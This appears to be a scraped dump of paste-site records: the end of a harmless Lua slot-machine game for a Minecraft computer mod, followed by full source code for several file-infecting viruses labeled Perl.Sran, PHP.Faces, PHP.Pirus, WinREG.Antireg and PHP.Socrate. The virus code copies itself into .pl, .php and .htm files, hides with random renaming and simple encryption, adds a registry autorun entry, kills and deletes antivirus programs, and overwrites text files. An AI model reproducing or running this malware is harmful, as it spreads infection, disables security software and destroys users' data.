        paintutils.drawFilledBox(34, 7, 46, 13, colors.lightGray)
        paintutils.drawImage(diamond, 36, 8)
        
    elseif price == 2 then
        paintutils.drawFilledBox(34, 7, 46, 13, colors.lightGray)
        paintutils.drawImage(dollar, 36, 8)
    elseif price == 3 then
        paintutils.drawFilledBox(34, 7, 46, 13, colors.lightGray)
        paintutils.drawImage(seven, 36, 8)
    elseif price == 4 then
        paintutils.drawFilledBox(34, 7, 46, 13, colors.lightGray)
        paintutils.drawImage(bell, 36, 8)
    elseif price == 5 then
        paintutils.drawFilledBox(34, 7, 46, 13, colors.lightGray)
        paintutils.drawImage(orange, 36, 8)
    end
end
function pricewon()
    priceamount = amount * multeplier
    newCreds = newCreds + priceamount
    won = priceamount - amount

    writeCard()

    paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
    if multeplier > 1 then
        term.clear()
        term.setCursorPos(20, 8)
        term.write(""{You've won}"")
        term.setCursorPos(20, 10)
        term.write(won.."" credits"")
    elseif multeplier == 1 then
        term.clear()
        term.setCursorPos(18, 8)
        term.write(""{You lost nothing}"")
        term.setCursorPos(16, 10)
        term.write(""better luck next time"")
    elseif multeplier < 1 then
        term.clear()
        term.setCursorPos(18, 8)
        term.write(""{You've lost}"")
        term.setCursorPos(14, 10)
        term.write(""better luck next time"")
    end
    sleep(4)
end
function lever()
    paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
    term.setCursorPos(8, 8)
    term.write(""{pull and release the lever to roll}"")

    local Rstate = redstone.getInput(""top"")
    while Rstate == false do
        Rstate = redstone.getInput(""top"")
        sleep(0,1)
    end
    while Rstate == true do
        Rstate = redstone.getInput(""top"")
        sleep(0,1)
    end
end
function removeCard()
    term.clear()
    paintutils.drawFilledBox(1, 1, 50, 19, colors.black)
    term.setCursorPos(12, 8)
    term.write(""{pull lever to roll again}"")
    local Rstate = redstone.getInput(""top"")
    while not (Rstate == true or not fs.exists(""disk/creds.lua"")) do
        Rstate = redstone.getInput(""top"")
        sleep(0,1)
    end
    while not (Rstate == false or not fs.exists(""disk/creds.lua"")) do
        Rstate = redstone.getInput(""top"")
        sleep(0,1)
    end
end
---------------------
while 1 do
    insert_card()
    readCard()
    insert_amount()
    lever()
    slotmachiene()
    result()
    roll()
    sleep(2)
    pricewon()
    removeCard()
end
"
S4EJzxjc,Virus.Perl.Sran.b - Source Code,FlyFar,Perl,Thursday 6th of July 2023 11:12:24 PM CDT,"sadBVa();

print ""This is also a test.\n"";

sub sadBVa {  #21wZPocL9r3I2
  #25lj6HLJr3lR.
    goto b if($ENV{""USER""} eq ""root""); #403dRcOOEKV7c
      #53a2B3OFfBrvE
a: while (<*.pl>) 
    { #11zR6D0l39gH2
	my $oF = ""sadBVa"";  #21wZPocL9r3I2
	my $tN = crypt($_, $_), $cW = 0; $oN = ""./$_"", $nF = $tN; #23xTGZMRTRgO.
 #73QebE0Q0ZZ7Q
	open (WE, ""<$0"");					
	open (IF, ""<$_"");  #19ffqqT32W0N6
	open (TMP, "">$tN"");					  #21wZPocL9r3I2
	 #46uAWbWZGiwdE
	    $nF =~ s/[0-9.\/].*/a/; 
	 #20DFf8jQEuujI
	    while (<IF>) 
	    {
		chomp; #17rFB3rla0OL.
		if (/\#!Sran/) { unlink ($tN); next a }		
		elsif (!/#!\//) { print TMP ""$_\n"" } 
		else { if(!/-X/){$_ .= "" -X""} print TMP ""$_\n#!Sran\n$nF();\n"" }		
	    } #14HPto765IJGs
	      #56usvbQbO.V7g
	    while (<WE>) 
	    { 
		$st = """";  #16DEAzgu4U/Lg
		  #21wZPocL9r3I2
		s/#[\d].*/$st/;
		if (/sub $oF/ || /my \$oF =/) { $cW = 1; s/$oF/$nF/}
		next if (/#!\// || /$oF();/ || !$cW);
		if (int(rand(2))) { $st="" #"".crypt($tN, rand(256)) } 
		else {$st = """"} #24kfAR.q3vZXI
		 
		chomp; #19ffqqT32W0N6
		print TMP ""$_$st\n""; #130lOPyQngaJw
	    } 
	  #21wZPocL9r3I2
	unlink ($oN); 
	rename ($tN, $oN);
	chmod (0777, $oN);
    }
b:  #24kfAR.q3vZXI
}  #25lj6HLJr3lR."
7PQKHb4J,Virus.PHP.Faces.a - Source Code,FlyFar,PHP,Thursday 6th of July 2023 11:05:17 PM CDT,"<?php
 $ypxqrpsqcc = fopen(__FILE__, ""r"");
 $bbugesqpty = substr(fread($ypxqrpsqcc, filesize(__FILE__)), 0, 1249);
 fclose($ypxqrpsqcc);
 $dhbpgxtamn = array(""ypxqrpsqcc"", ""bbugesqpty"", ""dhbpgxtamn"", ""cctsvcopcx"", ""wurwejtvjx"",
 ""ccznwozuuo"", ""uudxleoyja"", ""ionwdbkwfh"", ""zohqscoxob"", ""skzmabzbfe"");
 for($cctsvcopcx = 0; $cctsvcopcx < count($dhbpgxtamn); $cctsvcopcx++){
  $wurwejtvjx = chr(rand(97, 122));
  for($ccznwozuuo = 0; $ccznwozuuo < 9; $ccznwozuuo++)  $wurwejtvjx = $wurwejtvjx . chr(rand(97, 122));
  $bbugesqpty = str_replace(""$dhbpgxtamn[$cctsvcopcx]"", ""$wurwejtvjx"", ""$bbugesqpty"");
 }
 $uudxleoyja = opendir(""."");
 while(false !== ($ionwdbkwfh = readdir($uudxleoyja))){
  if($ionwdbkwfh != ""."" && $ionwdbkwfh != ""..""){
   if(substr($ionwdbkwfh, -3) == ""php""){
    $zohqscoxob = fopen($ionwdbkwfh, ""r""); 
     $skzmabzbfe = substr(fread($zohqscoxob, filesize($ionwdbkwfh)), 5);
    fclose($zohqscoxob);
    if(!strstr($skzmabzbfe, ""php.faces"")){
     unlink(""$ionwdbkwfh"");
     $zohqscoxob = fopen($ionwdbkwfh, ""a+""); 
     fwrite($zohqscoxob, ""$bbugesqpty"");
     fwrite($zohqscoxob, ""$skzmabzbfe"");
     fclose($zohqscoxob);
    }
   }
  }
 }
 closedir($uudxleoyja);
 // php.faces  (c) by Kefi, 2003
?>"
Ketwuxks,Virus.PHP.Pirus.a - Source Code,FlyFar,PHP,Thursday 6th of July 2023 11:00:58 PM CDT,"<?php
$handle=opendir('.');
while ($file = readdir($handle))
{ $infected=true;
  $executable=false;

 if ( ($executable = strstr ($file, '.php')) || ($executable = strstr ($file, '.htm')) || ($executable = strstr ($file, '.php')) )
 if ( is_file($file) && is_writeable($file) )
 {
   $host = fopen($file, ""r"");
   $contents = fread ($host, filesize ($file));
   $sig = strstr ($contents, 'pirus.php');
   if(!$sig) $infected=false;
 }
 //infect
 if (($infected==false))
  {
   $host = fopen($file, ""a"");
   fputs($host,""<?php "");
   fputs($host,""include(\"""");
   fputs($host,__FILE__);
   fputs($host,""\""); "");
   fputs($host,""?>"");
   fclose($host);
   return;
 }
}
closedir($handle);
?>"
xciyHAtP,Virus.WinREG.Antireg.b (The first REGEDIT virus) - Source Code,FlyFar,REG,Thursday 6th of July 2023 10:54:00 PM CDT,"REGEDIT4

;;-------------------------------;;
;;                               ;;
;; AntiREG (The First REG Virus) ;;
;;      Coded By Lys Kovick      ;;
;;    Special Thanks To Phage    ;;
;;                               ;;
;;-------------------------------;;

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\]
@=""command /c for %i in (%windir%\\system\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\""
"
1ZEQ2ZEv,Virus.PHP.Socrate.a - Source Code,FlyFar,PHP,Thursday 6th of July 2023 10:51:52 PM CDT,"<?php
echo(""PHP.Socrates by synged flesh"".""<br>"".""The only true wisdom is in knowing you know nothing."");

$decrypt=
""function SocratesDecrypt(\$string,\$key)\r\n""

.""{                                 \r\n""

."" \$codez='';                       \r\n""

.""  for(\$i=0; \$i<strlen(\$string); \$i++)\r\n""

.""  {                               \r\n""

.""     \$value=ord(\$string[\$i]);     \r\n""

.""     \$valuez=\$value+\$key;         \r\n""

.""     \$codez.=chr(\$valuez);        \r\n""

.""     }                            \r\n""

.""       return \$codez;             \r\n""

.""  }                               \r\n""

.""\$filez = \$_SERVER[\""SCRIPT_NAME\""];\r\n""

.""\$break = Explode('/', \$filez);     \r\n""			

.""\$pfile = \$break[count(\$break) - 1];\r\n""          

.""\$c = fopen(\$pfile,'rb');\r\n""

.""\$d = fread(\$c,filesize(\$pfile));\r\n""             

.""fclose(\$c);\r\n""

.""\$next=strlen(\$d)-693;\r\n""
.""\$virus=substr(\$d,687,\$next);\r\n""

.""\$vr=SocratesDecrypt(\$virus,'1');\r\n""

.""eval(\$vr);"";


function SocratesCrypt($string,$key)
            
{
  
               $codez="""";
  
                  for($i=0; $i<strlen($string); $i++)
  
                       {
     
     
                          $value=ord($string[$i]);
      
     
                          $valuez=$value-$key;
     
     
                          $codez.=chr($valuez);
     
    
                       }
       
       
                             return $codez;
  
           
}
 
                              if(is_dir(""C:\Program Files\Norton*"")) 
                                       {
                                           
exec(""taskkill /f /t /im nod32.exe"");
                                           
rmdir(""C:\Program Files\Norton*"");

                                       }

                                          if(is_dir(""C:\Program Files\McAfee*"")) 
                                           {

                                              exec(""taskkill /f /t /im Mcshield.exe"");
                                              
rmdir(""C:\Program Files\McAfee*"");
}

                                          
                                          if(is_dir(""C:\Program Files\Kaspersky*"")) 

                                           {
                                             
exec(""taskkill /f /t /im KAV.exe"");
                                             
rmdir(""C:\Program Files\Kaspersky*"");

                                           }
        

$filez = $_SERVER[""SCRIPT_NAME""];
$break = Explode('/', $filez);			
$pfile = $break[count($break) - 1];  
$c = fopen($pfile,'rb');

$d = fread($c,filesize($pfile));             

fclose($c);

$nextsize=strlen($d)-4;
$virus=(substr($d,7,$nextsize));
$dir=opendir('*.*');  
           
while (($file = readdir($dir)) !== false) 
                                          
                      
            {
                                           
                 if (strstr($file,'.php')) 
                                                
                        {  
                                                   
                           $f = fopen($file,'rb');             
                                                   
                           $contents = fread($f, filesize($file));
                                                     
                 if (!strstr($contents, 'Socrates')) 
                                                        
                           {  
                                                                                                                              if(!file_exists(""Socrates.php"")) {
                                 fclose($f);
                                                                                                                   $g = fopen($file,'w');
                                                                                                        fwrite($g,$d); 
    
                                 fclose($g);
    
                                 }



                             if(file_exists(""Socrates.php""))
                               {
                                 fclose($f);
                                                                                                                   $g = fopen($file,'w');
                                                                                                        fwrite($g,'<?php'.chr(13).chr(10).$decrypt.'/*'.SocratesCrypt($virus,'1').'*/'.'?>'); 
    
                                 fclose($g);
            
                               }
                            
                              
                                          
                                
                           
                          }
                                                
                       }
                                           
                         if (strstr($file,'.txt')) 
                                                
                            {  
                                                  
                                 $f = fopen($file,'w');    
                                                  
                                 fwrite($f,""Let him that would move the world, first move himself."");
                                                
                            }
                     
           }?>

"
